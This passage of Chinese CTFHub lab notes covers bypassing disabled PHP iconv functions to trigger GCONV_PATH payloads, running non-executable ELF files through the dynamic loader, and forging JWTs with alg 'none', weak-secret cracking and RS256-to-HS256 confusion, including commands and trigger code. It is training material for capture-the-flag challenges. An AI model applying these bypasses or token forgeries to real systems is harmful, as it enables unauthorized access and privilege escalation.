*   **Bypass iconv 1 (使用 `iconv_strlen`):**
    *   **原理:** 如果 `iconv` 被禁，但 `iconv_strlen` 未被禁，`iconv_strlen` 同样会调用底层的 `iconv_open`，可以用来触发漏洞。
    ![bypass iconv 1 1](/ctfhub/images/iconv5.png) (phpinfo 显示 `iconv` 被禁，`iconv_strlen` 可用)
    *   **修改 Payload:** 将 `iconv_trigger.php` 中的 `iconv("PWN", "UTF-8", "test");` 替换为 `@iconv_strlen("test", "PWN");`。
    ![bypass iconv 1 2](/ctfhub/images/iconv6.png) (修改后的触发代码)

*   **Bypass iconv 2 (使用 Stream Filter `convert.iconv.*`):**
    *   **原理:** 如果 `iconv` 和 `iconv_strlen` 都被禁，PHP 的流过滤器 `convert.iconv.*`（例如用于 `file_get_contents` 或 `fopen`）在处理数据时也会调用底层的 `iconv` 实现，同样可以触发 `GCONV_PATH` 机制。
    ![bypass iconv 2 1](/ctfhub/images/iconv7.png) (phpinfo 显示 `iconv` 相关函数被大量禁用)
    *   **修改 Payload:** 将 `iconv_trigger.php` 中的触发部分替换为使用流过滤器，例如：
        ```php
        // Trigger using file_get_contents with convert.iconv filter
        // php://filter/read=convert.iconv.PWN.UTF-8/resource=php://temp
        // Creates a temporary stream, reads from it using the filter, triggering iconv
        if (function_exists('file_get_contents')) {
             @file_get_contents('php://filter/read=convert.iconv.PWN.UTF-8/resource=php://temp');
        } else {
             die("file_get_contents function is disabled.");
        } 
        ```
    ![bypass iconv 2 2](/ctfhub/images/iconv8.png) (修改后的触发代码)

---

# Linux 特殊执行技巧

## 1. 动态加载器执行无执行权限文件 (Dynamic Loader Execution Bypass)

*   **概述 (Overview):** Linux 系统在执行 ELF (Executable and Linkable Format) 文件时，通常会依赖一个动态链接器/加载器 (如 `/lib64/ld-linux-x86-64.so.2` 用于 64 位系统) 来加载程序及其依赖的共享库。这个动态加载器本身是一个可执行文件。我们可以直接运行动态加载器，并将目标 ELF 文件作为参数传递给它，以此来执行目标 ELF 文件，即使该文件本身没有设置执行权限 (`x`)。
*   **识别特征 / 使用场景 (Identification / Use Cases):**
    *   在 CTF 或渗透测试中，发现一个包含关键信息（如 flag 读取逻辑）的 ELF 可执行文件，但该文件只有读取权限 (`r`)，没有执行权限 (`x`)。
    *   需要运行一个程序，但无法通过 `chmod +x` 修改其权限。
*   **工作原理 (Working Principle):**
    1.  **正常执行流程:** 当用户尝试执行一个 ELF 文件 (如 `./program`) 时，Shell 调用 `execve()` 系统调用。内核检查文件的执行权限位。如果权限不足，`execve()` 失败。如果权限足够，内核会读取 ELF 文件的头部，找到其指定的“解释器”（通常就是动态加载器的路径），然后加载并执行这个动态加载器，并将目标程序路径作为参数传递给它。
    2.  **动态加载器工作:** 动态加载器被内核执行后，它负责读取目标程序（作为参数传递给它的那个文件）的 ELF 头，解析依赖关系，加载所需的共享库 (`.so` 文件) 到内存，进行符号重定位，最后跳转到目标程序的入口点开始执行。**关键在于**，动态加载器完成这些操作只需要对目标 ELF 文件有**读取权限**即可。
    3.  **绕过执行:** 通过直接运行动态加载器 (`/lib64/ld-linux-x86-64.so.2 ./program`)，我们实际上是在执行动态加载器这个**有执行权限**的程序。目标 ELF 文件 (`./program`) 只是作为参数传递给它。因此，内核的 `execve()` 权限检查是对动态加载器进行的（通常允许），而不是对目标 ELF 文件。动态加载器随后只需要读取目标文件就能加载并运行它，从而绕过了目标文件本身缺少执行权限的限制。
    *   **相关命令:**
        *   `readelf -e <file>` 或 `readelf -l <file>`: 查看 ELF 头信息，可以找到 `Requesting program interpreter`。
        *   `ldd <file>`: 查看程序依赖的动态库。
*   **利用步骤 / 示例 (Exploitation Steps / Example):**
    1.  **识别目标文件和加载器:** 找到目标 ELF 文件（例如 `readflag`）和系统的动态加载器路径（通常是 `/lib64/ld-linux-x86-64.so.2` 或 `/lib/ld-linux.so.2`）。
    2.  **执行命令:** 在 Shell 中运行：
        ```bash
        /lib64/ld-linux-x86-64.so.2 ./readflag
        ```
        (将 `./readflag` 替换为实际的目标文件路径)
*   **CTFHUB 示例 (CTFHUB Example):**
    ![动态加载器 1](/ctfhub/images/linux1.png)
    (WebShell 中看到 `readflag` 文件权限为 `644`，没有执行权限)
    ![动态加载器 2](/ctfhub/images/linux2.png)
    (通过直接调用 `/lib64/ld-linux-x86-64.so.2 ./readflag` 成功执行并获取 Flag)
*   **注意事项 (Considerations):**
    *   动态加载器的路径可能因系统架构 (32/64 位) 和发行版而异。
    *   此方法只绕过文件系统执行权限检查，如果程序内部有其他权限检查（如检查 UID），则那些检查仍然会生效。
    *   目标文件必须是动态链接的 ELF 文件；静态链接的文件不依赖外部加载器。

---

# JSON Web Token (JWT) 安全问题

## 概述 (Overview)

JSON Web Token (JWT) 是一种基于 JSON 的开放标准 (RFC 7519)，用于在网络应用环境间安全地传递声明（claims）。它被设计为紧凑且自包含，特别适用于分布式系统的单点登录 (SSO) 和 API 认证场景。JWT 使得服务器无需在后端存储 Session 状态，因为所有必要的用户信息和权限都包含在 Token 本身，并通过签名保证其完整性和认证性。

## JWT 结构详解 (JWT Structure Details)

一个 JWT 通常由三部分组成，通过点 (`.`) 分隔：`Header.Payload.Signature`。

*   **Header (头部):**
    *   描述 JWT 元数据的 JSON 对象，通常包含签名算法 (`alg`) 和 Token 类型 (`typ`, 通常是 "JWT")。
    *   **示例 (解码后):**
        ```json
        {
          "alg": "HS256", 
          "typ": "JWT"
        }
        ```
    *   此部分进行 Base64Url 编码后构成 JWT 的第一部分。

*   **Payload (负载):**
    *   包含实际需要传递的声明 (claims) 的 JSON 对象。声明是关于实体（通常是用户）和其他数据的陈述。
    *   **标准声明 (Registered Claims):** JWT 规范预定义了一些可选的标准字段：
        *   `iss` (Issuer): 签发者。
        *   `sub` (Subject): 主题 (通常是用户 ID)。
        *   `aud` (Audience): 接收者。
        *   `exp` (Expiration Time): 过期时间戳。
        *   `nbf` (Not Before): 生效时间戳。
        *   `iat` (Issued At): 签发时间戳。
        *   `jti` (JWT ID): 唯一标识符。
    *   **私有声明 (Private Claims):** 可以在此部分添加自定义字段，用于传递应用程序特定的信息（如用户角色、权限等）。
    *   **示例 (解码后):**
        ```json
        {
          "sub": "1234567890",
          "name": "CTFHub",
          "role": "admin", 
          "iat": 1516239022
        }
        ```
    *   **重要:** Payload **默认只进行 Base64Url 编码，并未加密**。任何持有 Token 的人都可以解码并读取其内容。**切勿在 Payload 中存放敏感信息** (如密码)。
    *   此部分进行 Base64Url 编码后构成 JWT 的第二部分。

*   **Signature (签名):**
    *   用于验证 Token 的发送者身份并确保消息在传输过程中未被篡改。
    *   **生成过程:**
        1.  取 Base64Url 编码后的 Header 和 Payload，用点 (`.`) 连接起来 (`encodedHeader + "." + encodedPayload`)。
        2.  使用 Header 中指定的签名算法 (`alg`) 和一个密钥 (对于对称算法如 HS256 是一个共享密钥 `secret`；对于非对称算法如 RS256 是发送方的私钥) 对连接后的字符串进行签名。
        *   **HS256 示例:** `HMACSHA256(encodedHeader + "." + encodedPayload, secret)`
        *   **RS256 示例:** `RSASSA-PKCS1-v1_5-SIGN(SHA256(encodedHeader + "." + encodedPayload), privateKey)`
    *   此签名进行 Base64Url 编码后构成 JWT 的第三部分。

## 常见安全问题与利用 (Common Security Issues & Exploitation)

### 1. 敏感信息泄露 (Sensitive Data Exposure)

*   **原理 (Principle):** 如上所述，JWT 的 Payload 部分默认仅使用 Base64Url 编码，并非加密。如果开发者不慎将敏感信息（如用户内部 ID、权限详情、甚至密码相关信息）放入 Payload，这些信息对于任何能获取到 Token 的人都是可见的。
*   **利用 (Exploitation):**
    1.  获取 JWT Token (例如从 Cookie、Authorization Header、URL 参数或 Local Storage)。
    2.  将 Token 按点 (`.`) 分割成三部分。
    3.  取第二部分 (Payload)，进行 Base64Url 解码即可读取其中的 JSON 数据。
    4.  查找是否有敏感信息。
*   **示例 (CTFHUB Example):**
    ![敏感信息泄露 1](/ctfhub/images/jwt1.png)
    (抓包获取 Cookie 中的 Token)
    ![敏感信息泄露 2](/ctfhub/images/jwt2.png)
    (解码 Payload 部分，发现敏感信息，可能是 Flag 或用于后续步骤)

### 2. 签名未验证 / 算法置空 (Signature Not Verified / Algorithm `None`)

*   **原理 (Principle):** JWT 标准定义了一个特殊的签名算法值 `"none"`，表示该 Token 不使用签名。一些 JWT 库如果配置不当或存在漏洞，在验证 Token 时，如果 Header 中的 `alg` 字段被设置为 `"none"`，可能会完全跳过签名验证步骤，直接接受 Payload 中的内容。
*   **利用 (Exploitation):**
    1.  获取一个有效的 JWT Token。
    2.  解码 Header 部分，将其中的 `alg` 字段值修改为 `"none"` (注意大小写敏感性，通常是 `"none"` 或 `"None"`)。
    3.  (可选) 解码 Payload 部分，修改其中的声明（例如将用户角色从 `"guest"` 改为 `"admin"`）。
    4.  重新对修改后的 Header 和 Payload 进行 Base64Url 编码。
    5.  将编码后的 Header 和 Payload 用点 (`.`) 连接起来，**并将第三部分 (Signature) 删除或置为空字符串** (即 `encodedHeader.encodedPayload.` 或 `encodedHeader.encodedPayload`)。
    6.  使用这个伪造的 Token 替换原始 Token 发送给服务器。
*   **示例 (CTFHUB Example):**
    ![无签名 1](/ctfhub/images/jwt3.png)
    (抓包获取原始 Token)
    ![无签名 2](/ctfhub/images/jwt4.png)
    (解码 Header 改 `alg` 为 `none`，解码 Payload 改 `role` 为 `admin`，重新编码并移除签名部分)
    ![无签名 3](/ctfhub/images/jwt5.png)
    (重放修改后的 Token，获得 Admin 权限或 Flag)

### 3. 弱密钥爆破 (Weak Secret Brute-force - HS256)

*   **原理 (Principle):** 当 JWT 使用对称加密算法（如 `HS256`, `HS384`, `HS512`）时，签名和验证都依赖于同一个共享密钥 (`secret`)。如果服务器使用的这个密钥非常简单或容易猜测（例如 "secret", "password", "123456"，或者存在于常用字典中），攻击者可以通过暴力破解或字典攻击的方式猜解出密钥。
*   **利用 (Exploitation):**
    1.  获取一个使用对称算法 (如 Header 中 `alg` 为 `HS256`) 签名的 JWT Token。
    2.  使用 JWT 破解工具（如 `jwt-cracker`, `hashcat` 的 JWT 模式, `jwt_tool` 的爆破功能）和字典文件尝试爆破密钥。
    3.  **命令示例 (jwt-cracker):** `jwt-cracker <token> -a HS256 -d <dictionary_file>`
    4.  一旦破解出密钥，攻击者就可以使用该密钥任意伪造 Token：修改 Payload（例如提升权限），然后用找到的密钥重新计算签名。
*   **示例 (CTFHUB Example):**
    ![弱密钥 1](/ctfhub/images/jwt6.png)
    (抓包获取 HS256 Token)
    ![弱密钥 2](/ctfhub/images/jwt7.png)
    (使用 `jwt-cracker` 和字典爆破出密钥)
    ![弱密钥 3](/ctfhub/images/jwt8.png)
    (使用找到的密钥和 `jwt_tool` 或在线工具，修改 Payload 中 `role` 为 `admin` 并重新生成签名，构造完整 Token)
    ![弱密钥 4](/ctfhub/images/jwt9.png)
    (重放伪造的 Token 获取 Flag)

### 4. 签名算法篡改 (Algorithm Confusion / Substitution Attack - RS256 to HS256)

*   **原理 (Principle):** 这是一个经典的 JWT 漏洞。服务器端代码在验证 Token 时，可能设计为同时支持非对称算法（如 `RS256`，使用公钥验证）和对称算法（如 `HS256`，使用密钥验证）。如果服务器获取验证密钥的逻辑不严谨，例如直接信任 Header 中的 `alg` 字段来决定使用哪个密钥以及如何验证，就会出现问题。攻击者可以：
    1.  获取服务器用于验证 `RS256` 签名的公钥（公钥通常是公开的或容易获取）。
    2.  修改 JWT Header，将 `alg` 字段从 `RS256` 改为 `HS256`。
    3.  修改 Payload 以获得更高权限（例如 `role: admin`）。
    4.  使用 **获取到的公钥** 作为 **HS256 算法的密钥**，对修改后的 `encodedHeader.encodedPayload` 进行签名。
    5.  将伪造的 Token 发送给服务器。
    6.  服务器看到 `alg` 是 `HS256`，错误地使用**公钥**作为 HS256 的密钥来验证签名。由于签名是用同一个“密钥”（即公钥）生成的，验证会通过。
*   **利用条件 (Exploitation Conditions):**
    *   服务器端 JWT 验证逻辑同时接受多种算法（特别是 RS256 和 HS256）。
    *   服务器端根据 Header 中的 `alg` 字段来选择验证密钥和方法。
    *   攻击者能够获取到服务器用于验证 RS256 签名的公钥。
*   **利用 (Exploitation):**
    1.  获取原始 Token (通常是 RS256 签名) 和服务器的公钥 (`publickey.pem`)。
    2.  使用工具 (如 `jwt_tool`) 或脚本，构造新的 Token:
        *   Header: `{ "alg": "HS256", "typ": "JWT" }`
        *   Payload: `{ ..., "role": "admin", ... }` (修改需要的部分)
        *   Signature: 使用 HS256 算法，以**公钥文件的内容**作为密钥，对 `base64url(header) + "." + base64url(payload)` 进行签名。
    3.  **命令示例 (jwt_tool):**
        ```bash
        # -I: Input token (optional, helps copy structure)
        # -hc: Modify header claim (alg to HS256)
        # -pc: Modify payload claim (e.g., role to admin)
        # -S: Sign using specified algorithm (hs256)
        # -k: Key file (provide the public key here!)
        python jwt_tool.py <original_token> -I -hc alg HS256 -pc role admin -S hs256 -k publickey.pem 
        ```
    4.  将生成的伪造 Token 发送给服务器。
*   **示例 (CTFHUB Example):**
    *   **源码分析:**
        ```php
        // ...
        $PUBLIC_KEY = file_get_contents("./publickey.pem");
        // ...
        $header = JWTHelper::getHeader($token);
        // !! Vulnerable part: merges header's alg with default alg !!
        $algs = array_merge(array($header->alg), array('RS256')); // Could accept HS256 if header->alg is HS256
        // !! Uses the same $PUBLIC_KEY regardless of the algorithm chosen !!
        return JWT::decode($token, $PUBLIC_KEY, $algs); 
        // ...
        ```
        代码显示 `decode` 函数接受头部指定的算法，并且总是使用 `$PUBLIC_KEY` 来验证，这正是漏洞所在。
    ![修改签名算法 1](/ctfhub/images/jwt10.png)
    (使用 `jwt_tool`，将算法改为 `HS256`，修改 payload，并使用 `publickey.pem` 作为 HS256 的密钥进行签名)
    ![修改签名算法 2](/ctfhub/images/jwt11.png)
    (重放伪造的 Token 获得 Flag)

## 注意事项 (Considerations)

*   **密钥管理:** 对于 HS256 等对称算法，密钥的保密至关重要，且应足够复杂。对于 RS256 等非对称算法，私钥必须保密。
*   **算法验证:** 服务器端**必须**严格校验 `alg` 头部字段，只接受预期的算法，并且根据算法类型使用正确的密钥（私钥签名，公钥验签；共享密钥签验）。**绝不能**直接信任客户端提供的 `alg` 来选择密钥或验证方法。
*   **Payload 内容:** 不要在 Payload 中存储敏感信息。如果需要传输敏感数据，应考虑使用 JWE (JSON Web Encryption) 对 Payload 进行加密。
*   **过期时间 (`exp`):** 务必设置合理的过期时间，并严格验证。
*   **重放攻击:** 考虑使用 `jti` (JWT ID) 声明并配合服务器端存储已使用的 JTI 来防止重放攻击。
*   **工具:** `jwt.io` (在线调试), `jwt_tool` (命令行), `Burp Suite` 的 `JSON Web Tokens` 插件等都是分析和利用 JWT 的常用工具。